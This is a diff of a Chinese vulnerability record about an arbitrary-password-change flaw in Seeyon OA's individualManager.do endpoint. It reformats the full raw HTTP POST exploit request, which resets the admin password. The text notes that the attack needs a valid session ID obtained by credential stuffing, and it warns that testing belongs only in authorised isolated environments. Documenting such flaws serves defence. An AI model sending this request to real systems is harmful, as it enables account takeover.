@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -59,36 +59,36 @@ schema_version: "1"
 POST如下数据
 
 ```http
-    POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0
+POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0
 
-    Accept: text/html, application/xhtml+xml, */*
+Accept: text/html, application/xhtml+xml, */*
 
-    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame
+Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame
 
-    Accept-Language: zh-CN
+Accept-Language: zh-CN
 
-    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
 
-    Content-Type: application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded
 
-    Proxy-Connection: Keep-Alive
+Proxy-Connection: Keep-Alive
 
-    Pragma: no-cache
+Pragma: no-cache
 
-    Content-Length: 86
+Content-Length: 86
 
-    DNT: 1
+DNT: 1
 
-    Host: www.0-sec.org
+Host: www.0-sec.org
 
-    Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"
+Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"
 
 
 
-    individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456
+individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456
 
-individualName为用户名
 ```
+individualName为用户名
 
 注意，此处需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出。
 
